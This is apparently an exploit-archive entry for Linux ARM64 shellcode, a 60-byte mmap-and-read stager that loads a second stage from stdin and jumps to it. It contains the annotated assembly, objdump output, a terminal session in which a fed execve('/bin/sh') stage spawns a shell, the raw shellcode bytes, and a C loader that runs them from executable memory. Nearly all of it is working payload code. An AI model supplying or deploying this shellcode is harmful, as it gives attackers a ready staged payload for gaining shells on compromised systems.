/*
# Title:  Linux/ARM64 - mmap() + read() stager + execve("/bin/sh", NULL, NULL) Shellcode (60 Bytes)
# Date:   2019-06-30
# Tested: Ubuntu 16.04 (aarch64)
# Author: Ken Kitahara
# Compilation: gcc -o loader loader.c


ubuntu@ubuntu:~/works$ lsb_release -a
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu Xenial Xerus (development branch)
Release:	16.04
Codename:	xenial
ubuntu@ubuntu:~/works$ uname -a
Linux ubuntu 4.2.0-16-generic #19-Ubuntu SMP Thu Oct 8 15:00:45 UTC 2015 aarch64 aarch64 aarch64 GNU/Linux
ubuntu@ubuntu:~/works$ cat stager.s
.section .text
.global _start
_start:
    // *ret = mmap(0, 0x1000, PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE, -1, 0)
    mov  x8, #222             // Systemcall Number = 222 (mmap)
    mov  x0, xzr              // args[0] = 0x0
    mov  x3, 0x22             // args[3] = 0x22
    mvn  x4, xzr              // args[4] = -1 (0xffffffffffffffff)
    mov  x5, xzr              // args[5] = 0x0
    lsr  x2, x4, #61          // args[2] = 0x7
    add  x1, x2, #0xFF9       // args[1] = 0x1000
    svc  #0x1337              // Invoke Systemcall
    //read(0, *ret, 0x1000)
    mov  x2, x1               // args[2] = 0x1000
    add  x1, x0, xzr, lsl #12 // args[1] = *ret
    mov  x10, x1              // save *ret to x10
    mov  x0, xzr              // args[0] = 0x0
    mov  x8, #63              // Systemcall Number = 63 (read)
    svc  #0x1337              // Invoke Systemcall
    br   x10                  // Jump to loaded shellcode
ubuntu@ubuntu:~/works$ as -o stager.o stager.s && ld -o stager stager.o
ubuntu@ubuntu:~/works$ objdump -d ./stager

./stager:     file format elf64-littleaarch64


Disassembly of section .text:

0000000000400078 <_start>:
  400078:	d2801bc8 	mov	x8, #0xde                  	// #222
  40007c:	aa1f03e0 	mov	x0, xzr
  400080:	d2800443 	mov	x3, #0x22                  	// #34
  400084:	aa3f03e4 	mvn	x4, xzr
  400088:	aa1f03e5 	mov	x5, xzr
  40008c:	d37dfc82 	lsr	x2, x4, #61
  400090:	913fe441 	add	x1, x2, #0xff9
  400094:	d40266e1 	svc	#0x1337
  400098:	aa0103e2 	mov	x2, x1
  40009c:	8b1f3001 	add	x1, x0, xzr, lsl #12
  4000a0:	aa0103ea 	mov	x10, x1
  4000a4:	aa1f03e0 	mov	x0, xzr
  4000a8:	d28007e8 	mov	x8, #0x3f                  	// #63
  4000ac:	d40266e1 	svc	#0x1337
  4000b0:	d61f0140 	br	x10
ubuntu@ubuntu:~/works$ (echo -en "\xe1\x45\x8c\xd2\x21\xcd\xad\xf2\xe1\x65\xce\xf2\x01\x0d\xe0\xf2\xe1\x8f\x1f\xf8\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xe0\x63\x21\x8b\xa8\x1b\x80\xd2\xe1\x66\x02\xd4"; cat) | ./stager
id
uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),107(netdev)
exit

ubuntu@ubuntu:~/works$ objcopy -O binary stager stager.bin
ubuntu@ubuntu:~/works$ hexdump -v -e '"\\""x" 1/1 "%02x" ""' stager.bin && echo
\xc8\x1b\x80\xd2\xe0\x03\x1f\xaa\x43\x04\x80\xd2\xe4\x03\x3f\xaa\xe5\x03\x1f\xaa\x82\xfc\x7d\xd3\x41\xe4\x3f\x91\xe1\x66\x02\xd4\xe2\x03\x01\xaa\x01\x30\x1f\x8b\xea\x03\x01\xaa\xe0\x03\x1f\xaa\xe8\x07\x80\xd2\xe1\x66\x02\xd4\x40\x01\x1f\xd6

*/

#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] =
"\xc8\x1b\x80\xd2\xe0\x03\x1f\xaa\x43\x04\x80\xd2\xe4\x03\x3f\xaa"
"\xe5\x03\x1f\xaa\x82\xfc\x7d\xd3\x41\xe4\x3f\x91\xe1\x66\x02\xd4"
"\xe2\x03\x01\xaa\x01\x30\x1f\x8b\xea\x03\x01\xaa\xe0\x03\x1f\xaa"
"\xe8\x07\x80\xd2\xe1\x66\x02\xd4\x40\x01\x1f\xd6";

int main(int argc, char **argv) {
    printf("Shellcode Length: %zd Bytes\n", strlen(shellcode));

    void *ptr = mmap(0, 0x100, PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE, -1, 0);

    if (ptr == MAP_FAILED) {
        perror("mmap");
        exit(-1);
    }

    memcpy(ptr, shellcode, sizeof(shellcode));
    sc = ptr;

    sc();

    return 0;
}